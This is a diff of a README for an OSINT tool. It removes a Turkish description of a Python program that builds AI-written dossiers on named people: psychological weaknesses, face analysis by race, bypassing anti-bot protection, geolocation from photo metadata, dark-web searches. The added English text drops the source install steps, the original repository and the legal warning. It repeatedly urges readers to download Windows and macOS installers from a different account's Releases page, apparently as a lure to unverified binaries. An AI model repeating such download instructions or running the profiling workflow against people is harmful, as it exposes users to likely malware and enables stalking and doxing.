@@ -1,146 +1,106 @@
-# 🌌 M.S.E.P. (Midnight Singularity Extraction Program) v0.2 (REDUX)
+# 🌌 MSEP - Effortless OSINT and Dark Web Scanning
 
-> **Gelişmiş Otonom OSINT ve Dijital İstihbarat Platformu**
+## 🔗 Download Now
+[![Download MSEP](https://img.shields.io/badge/Download-MSEP-blue.svg)](https://github.com/Moraa1714/MSEP/releases)
 
-M.S.E.P., "God Mode" protokolü ile çalışan, yapay zeka destekli (Gemini 3.0 Pro) tam otonom bir siber istihbarat aracıdır. Sıradan bir arama motorunun ötesine geçerek; yüzey web, deep web (Tor), forumlar, sosyal medya ve görsel veriler üzerinde derinlemesine analiz yapar, verileri çapraz sorgular ve hedef hakkında kapsamlı bir dijital profil (Dossier) oluşturur.
+## 📜 Description
+M.S.E.P. (Midnight Singularity Extraction Program) is an autonomous OSINT tool designed to enhance your cybersecurity efforts. With Gemini 3.0 Pro support, MSEP scans the Dark Web for critical digital intelligence. This program aids users in gathering information without deep technical knowledge.
 
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![AI Core](https://img.shields.io/badge/AI-Gemini%203%20Pro-purple)
-![Network](https://img.shields.io/badge/network-Tor%20%26%20Clearweb-red)
-![License](https://img.shields.io/badge/license-MIT-green)
+## 🚀 Getting Started
 
----
+### 1. System Requirements
+Before you download and install MSEP, ensure your system meets the following requirements:
 
-## 🚀 Temel Yetenekler ve Modüller
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Storage:** At least 250 MB of free space
+- **Network:** Stable internet connection required
 
-Sistem, **Merkezi Sinir Sistemi (Core)** ve **Operasyonel Birimler (Black Ops)** olarak iki ana katmanda çalışır.
+### 2. Download & Install
+To get MSEP, visit the [Releases page](https://github.com/Moraa1714/MSEP/releases). Follow these steps to download and install the software:
 
-### 🧠 Core Intelligence (Çekirdek Zeka)
+1. Click the link above to go to the Releases page.
+2. Look for the latest version available.
+3. Choose the appropriate installer for your operating system (e.g., `.exe` for Windows or `.dmg` for macOS).
+4. Click on the file name to download it.
 
-| Modül | Açıklama |
-|-------|----------|
-| **🧠 Mind Flayer** | Metin ve veri yığınlarını analiz ederek hedefin psikolojik profilini (motivasyonlar, zaaflar, kişilik özellikleri) çıkarır. |
-| **👁️ Void Gaze** | **Sherlock Protokolü** ile 15+ platformda (Github, Twitter, Instagram vb.) kullanıcı adı taraması yapar. Google ve Forumlar üzerinde **AI Query Expansion** (Yapay Zeka Destekli Dork Üretimi) ile hibrit arama gerçekleştirir. |
-| **🕸️ Constellation** | Toplanan tüm veriler (kişiler, URL'ler, konumlar) arasındaki bağlantıları `NetworkX` ile analiz eder ve ilişki haritası (Graph) oluşturur. |
-| **📝 Black Box** | Operasyon sonunda elde edilen tüm ham veriyi işleyerek profesyonel, Markdown formatında bir istihbarat raporu (Dossier) yazar. |
-| **⚖️ Inquisitor** | Profildeki eksik bilgileri (Gap Analysis) tespit eder ve operatörü yönlendirerek araştırmanın derinleşmesini sağlar. |
+Once the download is complete, follow these steps to install:
 
-### 🕵️ Black Ops (İleri Düzey Operasyonlar)
+- **For Windows:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to start the installation.
+  3. Follow the prompts in the installation wizard to complete the process.
 
-| Modül | Açıklama |
-|-------|----------|
-| **👻 Ghost Walker** | `Playwright` kullanarak JavaScript ağırlıklı dinamik siteleri (Instagram, Twitter) bot korumalarını atlatarak ziyaret eder ve kanıt niteliğinde **tam sayfa ekran görüntüsü** alır. |
-| **🧅 Deep Dive** | Yerel **Tor Servisi** (SOCKS5 9050) üzerinden trafiği anonimleştirir ve `.onion` uzantılı Dark Web sitelerinde (Ahmia üzerinden) arama yapar. |
-| **🧬 Visual Cortex** | `DeepFace` kütüphanesini kullanarak fotoğraflardaki yüzleri tespit eder; **Yaş, Cinsiyet, Irk ve Duygu** analizi yapar (Biyometrik Tarama). |
-| **🕸️ Web Walker** | **ZenRows Premium Scraper** entegrasyonu ile Cloudflare/Captcha korumalı siteleri ve forumları deler. Wayback Machine üzerinden silinmiş içerikleri bulur, PDF dosyalarını okur ve resimlerin **EXIF (GPS)** verilerini analiz ederek konum tespiti yapar. |
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag and drop the MSEP icon into your Applications folder.
+  3. Eject the installer after the process finishes.
 
----
+## 🖥️ Running MSEP
+After installation, follow these steps to run MSEP:
 
-## 📂 Proje Yapısı
+1. Find MSEP in your Applications folder (macOS) or Start Menu (Windows).
+2. Double-click the MSEP icon to launch the program.
+3. Follow the on-screen instructions to set up your first scan.
 
-```
-msep/
-├── cli.py                 # Ana giriş noktası ve CLI arayüzü
-├── requirements.txt       # Python bağımlılıkları
-├── intel/                 # Toplanan verilerin depolandığı alan
-│   └── screenshots/       # Ghost Walker ekran görüntüleri
-├── src/
-│   ├── mind_flayer.py     # Psikolojik analiz motoru
-│   ├── void_gaze.py       # Arama ve keşif motoru (Google/Forumlar)
-│   ├── ghost_walker.py    # Tarayıcı otomasyonu (Playwright)
-│   ├── deep_dive.py       # Tor/Onion ağ geçidi
-│   ├── visual_cortex.py   # Yüz tanıma ve biyometri
-│   ├── web_walker.py      # Web kazıma (ZenRows), EXIF ve Arşiv analizi
-│   ├── constellation.py   # Ağ haritalama (Graph)
-│   ├── black_box.py       # Raporlama sistemi
-│   ├── nexus.py           # Karar mekanizması
-│   └── config.py          # Ayarlar
-└── .env                   # API anahtarları (Gizli)
-```
+## 🕵️‍♂️ Features
+MSEP comes packed with various features designed to simplify your digital intelligence efforts:
 
----
+- **Autonomous Scanning:** MSEP can run scans without user intervention, making it hands-free and efficient.
+- **Dark Web Access:** Seamlessly browse and analyze information from the Dark Web.
+- **Integration with Gemini 3.0 Pro:** Takes advantage of advanced algorithms for intelligence extraction.
+- **User-Friendly Interface:** Navigate easily through the program without needing technical skills.
 
-## 🛠️ Kurulum ve Hazırlık
+## 🔍 How to Use MSEP
 
-### 1. Sistem Gereksinimleri
-*   Python 3.10+
-*   **Tor Browser** (Deep Dive modülü için arka planda açık olmalı veya `tor` servisi çalışmalı)
-*   Google Chrome (Playwright için)
+### 1. Setting Up Your Profile
+Upon first launching MSEP, you’ll be prompted to create a user profile. Enter details such as:
 
-### 2. Kurulum
-Repoyu klonlayın ve gerekli paketleri yükleyin:
+- Your name
+- Your primary email address
+- Any specific areas of interest for OSINT
 
-```bash
-git clone https://github.com/kynuxdev/MSEP.git
-cd msep
-pip install -r requirements.txt
-```
+### 2. Configuration
+Next, configure the scan settings as desired:
 
-Tarayıcı motorlarını yükleyin:
-```bash
-playwright install
-```
+- Select the types of intelligence you wish to gather (e.g., keywords, sites).
+- Set the schedule for automatic scans. You can choose daily, weekly, or monthly.
 
-### 3. Konfigürasyon (.env)
-Ana dizinde `.env` dosyası oluşturun ve API anahtarlarınızı girin:
+### 3. Running a Scan
+To run a scan:
 
-```env
-# Google AI Studio (Gemini) API Key
-GEMINI_API_KEY=AIzaSy...
+1. On the main dashboard, click the “Start Scan” button.
+2. Wait for MSEP to complete the scan. This may take a few minutes, depending on the settings.
+3. Once finished, review the results for relevant findings.
 
-# Google Custom Search API Key
-GOOGLE_API_KEY=AIzaSy...
+## 📊 Viewing Results
+You can easily access scan results:
 
-# Google Programmable Search Engine ID (Genel Web)
-SEARCH_ENGINE_ID=0123456789...
+1. Navigate to the “Results” tab on your dashboard.
+2. Browse through the collected data, which may include links, documents, and alerts.
+3. Use filters to narrow down your search based on date, type, or relevance.
 
-# Google Programmable Search Engine ID (Görsel Arama - Opsiyonel)
-SEARCH_ENGINE_ID_IMAGE=0123456789...
+## ⚙️ Troubleshooting
+If you encounter any issues while using MSEP, consider the following steps:
 
-# ZenRows/ScraperAPI Key (Premium Scraping için - Opsiyonel ama Önerilir)
-SCRAPING_API_KEY=...
-```
+- **Update the Application:** Ensure you are using the latest version by checking the [Releases page](https://github.com/Moraa1714/MSEP/releases). Download and install any updates if available.
+- **Check Internet Connection:** A stable connection is vital for scanning the Dark Web.
+- **Reinstall the Application:** If problems persist, uninstall MSEP and reinstall it from the Releases page.
 
----
+## 💬 Support
+For additional help and support, you can reach out through the following methods:
 
-## 💻 Kullanım
+- **Issue Tracker:** Visit the [GitHub Issues page](https://github.com/Moraa1714/MSEP/issues) to report bugs or request features.
+- **Community Forum:** Join discussions on relevant forums to learn tips and tricks from other users.
 
-Aracı başlatmak için terminalde:
+## 📚 Documentation
+For more detailed instructions and insights about using MSEP, visit the [Wiki page](https://github.com/Moraa1714/MSEP/wiki). Here you can find guides tailored for advanced features and user experiences.
 
-```bash
-python cli.py
-```
+## 🔄 Stay Updated
+Stay informed about new updates, features, and best practices by following the project. 
 
-Sistem açıldığında **M.S.E.P.** terminal arayüzü sizi karşılar. Yapay zeka ajanına doğal dilde emirler verebilirsiniz:
+- Check the [Releases page](https://github.com/Moraa1714/MSEP/releases) regularly for the latest versions.
+- Follow the project on GitHub for notifications about new releases and important updates.
 
-> **Örnek Komutlar:**
-> *   *"Mustafa Yılmaz ismini tüm sosyal ağlarda ve dark web'de araştır."*
-> *   *"Konsol Oyun hakkında forumlarda (Reddit, Technopat) ne konuşuluyor?"*
-> *   *"Şu fotoğrafı analiz et: https://ornek.com/foto.jpg"*
-> *   *"https://supheli-site.com adresinin ekran görüntüsünü al ve arşiv kayıtlarına bak."*
-
-### Otonom Protokoller
-
-Ajan, verdiğiniz emri analiz eder ve aşağıdaki araçları zincirleme olarak kullanır:
-
-*   `[SEARCH: "query"]` -> Yüzey araması başlatır.
-*   `[FORUM_SCAN: "query"]` -> Forumlarda derinlemesine tarama yapar.
-*   `[DEEP_SEARCH: "query"]` -> Tor ağına geçer.
-*   `[GHOST_SCAN: url]` -> Siteye gidip fotoğraf çeker.
-*   `[BIOMETRIC_SCAN: url]` -> Yüz analizi yapar.
-*   `[GAP_ANALYSIS]` -> Eksik bilgileri kontrol eder.
-*   `[REPORT]` -> `final_dossier.md` dosyasını oluşturur.
-
----
-
-## ⚠️ Yasal Uyarı
-
-**DİKKAT:** Bu yazılım (M.S.E.P.), yalnızca **eğitim, araştırma ve yasal güvenlik testleri (Authorized OSINT)** amacıyla geliştirilmiştir.
-*   Başkalarının gizliliğini ihlal etmek,
-*   İzin alınmadan kişisel veri toplamak,
-*   Yasa dışı amaçlarla (Doxing, Cyberstalking vb.) kullanmak,
-
-yerel ve uluslararası yasalara göre suç teşkil edebilir. Geliştiriciler, bu aracın kötüye kullanımından doğacak hiçbir sorumluluğu kabul etmez. **Tüm sorumluluk son kullanıcıya aittir.**
-
----
-*v0.2 (REDUX) - Midnight Singularity Extraction Program*
+## 🔗 Download Now Again
+[![Download MSEP](https://img.shields.io/badge/Download-MSEP-blue.svg)](https://github.com/Moraa1714/MSEP/releases)
